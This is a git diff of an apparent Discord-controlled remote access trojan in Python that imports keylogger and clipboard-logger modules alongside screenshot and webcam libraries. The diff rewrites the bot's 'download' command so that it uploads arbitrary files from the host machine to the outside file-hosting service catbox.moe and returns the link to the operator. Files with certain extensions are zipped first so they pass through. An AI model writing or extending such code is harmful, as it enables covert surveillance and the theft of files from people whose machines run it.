@@ -1,12 +1,13 @@
-import os, datetime, pyautogui, subprocess, zipfile, requests, cv2
-import discord, io
+import os, datetime, pyautogui, subprocess, requests, cv2, zipfile
+import discord, io, aiohttp
 
 from Clip_logging import Cliplogger
 from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'YOUR_TOKEN_HERE'
+TOKEN = 'TOKEN-SERVER'
+BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
 intent.message_content = True
@@ -101,29 +102,64 @@ async def upload(ctx: commands.Context, url=None, local_file=None):
         await ctx.send(f"{e}")
 
 @bot.command()
-async def download(ctx: commands.Context, file):
-    limit = 20 * 1024 * 1024
-    zipped = f"{file}.zip"
+async def download(ctx: commands.Context, file:str):
+    if not os.path.exists(file):
+        await ctx.send("file not found")
+        return
 
-    if not file:
-        return await ctx.send("enter the filename you want to download")
+    url = "https://catbox.moe/user/api.php"
 
-    if os.path.getsize(file) > limit:
-        await ctx.send("file is too big, compressing into zip")
+    file_dir = os.path.dirname(file)
+    base_name = os.path.basename(file)
+    name, ext = os.path.splitext(base_name)
 
-        with zipfile.ZipFile(zipped, 'w', zipfile.ZIP_DEFLATED) as f:
-            f.write(file, arcname=os.path.basename(file))
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    
+    payload = aiohttp.FormData()
+    payload.add_field('reqtype', 'fileupload')
+    payload.add_field('userhash', '')
 
-        if os.path.getsize(zipped) < limit:
-            with open(zipped, 'rb') as f:
-                await ctx.send(f"the compressed file:", file=discord.File(f))
-            os.remove(zipped)
+    status = await ctx.send("processing file..")
+
+    try:
+        if ext.lower() in BANNED_EXTENSIONS:
+            zipname = f"{name}_{timestamp}.zip"
+            zippath = os.path.join(file_dir, zipname) if file_dir else zipname
+
+            await ctx.send("bad extension detected, zipping it..")
+
+            with zipfile.ZipFile(zippath, 'w', zipfile.ZIP_DEFLATED) as z:
+                z.write(file, base_name)
+            
+            await ctx.send("sending zipped file..")
+
+            with open(zippath, 'rb') as zf:
+                payload.add_field('fileToUpload', zf, filename=zipname, content_type='application/zip')
+                async with aiohttp.ClientSession() as session:
+                    async with session.post(url, data=payload) as response:
+                        response_txt = await response.text()
+                        statuscode = response.status
+                        
+            if os.path.exists(zippath):
+                os.remove(zippath)
         else:
-            await ctx.send("the compressed file is still above the limit, aborting")
-            os.remove(zipped)
-    else:
-        with open(file, 'rb') as f:
-            await ctx.send("file is ready to download:", file=discord.File(f))
+            safename = f"{name}{ext}"
+            await ctx.send(f"downloading.. '{safename}'")
+
+            with open(safename, 'rb') as f:
+                payload.add_field('fileToUpload', f, filename=safename)
+
+                async with aiohttp.ClientSession() as session:
+                    async with session.post(url, data=payload) as response:
+                        response_txt = await response.text()
+                        statuscode = response.status
+
+        if statuscode == 200:
+            await ctx.send(f"**file is ready to download!**\n```\n{response_txt}\n```")
+        else:
+            await ctx.send(f"**failed to turn file into link**")
+    except Exception as e:
+        await ctx.send(f"{e}")
 
 @bot.command()
 async def size(ctx: commands.Context, file):
